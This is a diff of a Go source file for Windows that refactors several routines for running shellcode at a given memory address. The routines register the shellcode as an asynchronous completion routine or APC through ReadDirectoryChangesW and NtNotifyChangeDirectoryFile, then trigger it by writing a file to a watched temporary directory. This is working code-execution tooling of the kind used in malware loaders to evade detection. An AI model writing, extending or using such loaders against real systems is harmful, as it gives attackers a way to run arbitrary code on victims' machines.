@@ -143,15 +143,14 @@ func executeCertEnum(addr uintptr) error {
 	return nil
 }
 
-// executeReadDirChanges registers shellcode as an async completion routine via
-// ReadDirectoryChangesW, then triggers it by creating a file in the watched dir.
-func executeReadDirChanges(addr uintptr) error {
-	tmp, err := os.MkdirTemp("", "rdc-*")
+// openTempDirForWatch creates a temp directory and opens it async (FILE_FLAG_OVERLAPPED)
+// for ReadDirectoryChangesW / NtNotifyChangeDirectoryFile. Caller must CloseHandle
+// the returned handle and os.Remove the returned path.
+func openTempDirForWatch(prefix string) (windows.Handle, string, error) {
+	tmp, err := os.MkdirTemp("", prefix)
 	if err != nil {
-		return fmt.Errorf("create temp dir: %w", err)
+		return 0, "", fmt.Errorf("create temp dir: %w", err)
 	}
-	defer os.Remove(tmp)
-
 	p, _ := syscall.UTF16PtrFromString(tmp)
 	hDir, err := windows.CreateFile(
 		p,
@@ -163,9 +162,30 @@ func executeReadDirChanges(addr uintptr) error {
 		0,
 	)
 	if err != nil {
-		return fmt.Errorf("open temp dir: %w", err)
+		os.Remove(tmp) //nolint:errcheck
+		return 0, "", fmt.Errorf("open temp dir: %w", err)
+	}
+	return hDir, tmp, nil
+}
+
+// triggerDirChange writes then removes a file in dir to trigger any pending
+// directory change notification, then drains APCs via SleepEx(alertable).
+func triggerDirChange(dir string, drainMs uint32) {
+	dummy := dir + "\\x"
+	os.WriteFile(dummy, []byte{}, 0600) //nolint:errcheck
+	os.Remove(dummy)                    //nolint:errcheck
+	windows.SleepEx(drainMs, true)
+}
+
+// executeReadDirChanges registers shellcode as an async completion routine via
+// ReadDirectoryChangesW, then triggers it by creating a file in the watched dir.
+func executeReadDirChanges(addr uintptr) error {
+	hDir, tmp, err := openTempDirForWatch("rdc-*")
+	if err != nil {
+		return err
 	}
 	defer windows.CloseHandle(hDir)
+	defer os.Remove(tmp)
 
 	buf := make([]byte, 4096)
 	var bytesReturned uint32
@@ -184,12 +204,7 @@ func executeReadDirChanges(addr uintptr) error {
 	if ret == 0 {
 		return fmt.Errorf("ReadDirectoryChangesW: %w", callErr)
 	}
-
-	// Trigger by creating then deleting a file in the watched directory.
-	dummy := tmp + "\\x"
-	os.WriteFile(dummy, []byte{}, 0600)  //nolint:errcheck
-	os.Remove(dummy)                     //nolint:errcheck
-	windows.SleepEx(50, true)
+	triggerDirChange(tmp, 50)
 	return nil
 }
 
@@ -224,26 +239,12 @@ func executeRtlRegisterWait(addr uintptr) error {
 // executeNtNotifyChange registers shellcode as an APC via NtNotifyChangeDirectoryFile,
 // then triggers it by creating a file in the watched directory.
 func executeNtNotifyChange(addr uintptr) error {
-	tmp, err := os.MkdirTemp("", "ntnotify-*")
+	hDir, tmp, err := openTempDirForWatch("ntnotify-*")
 	if err != nil {
-		return fmt.Errorf("create temp dir: %w", err)
-	}
-	defer os.Remove(tmp)
-
-	p, _ := syscall.UTF16PtrFromString(tmp)
-	hDir, err := windows.CreateFile(
-		p,
-		windows.FILE_LIST_DIRECTORY,
-		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
-		nil,
-		windows.OPEN_EXISTING,
-		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
-		0,
-	)
-	if err != nil {
-		return fmt.Errorf("open temp dir: %w", err)
+		return err
 	}
 	defer windows.CloseHandle(hDir)
+	defer os.Remove(tmp)
 
 	buf := make([]byte, 4096)
 	overlapped := new(windows.Overlapped)
@@ -262,10 +263,6 @@ func executeNtNotifyChange(addr uintptr) error {
 	if r != 0 {
 		return fmt.Errorf("NtNotifyChangeDirectoryFile: NTSTATUS 0x%X: %w", uint32(r), callErr)
 	}
-
-	dummy := tmp + "\\x"
-	os.WriteFile(dummy, []byte{}, 0600)  //nolint:errcheck
-	os.Remove(dummy)                     //nolint:errcheck
-	windows.SleepEx(100, true)
+	triggerDirChange(tmp, 100)
 	return nil
 }
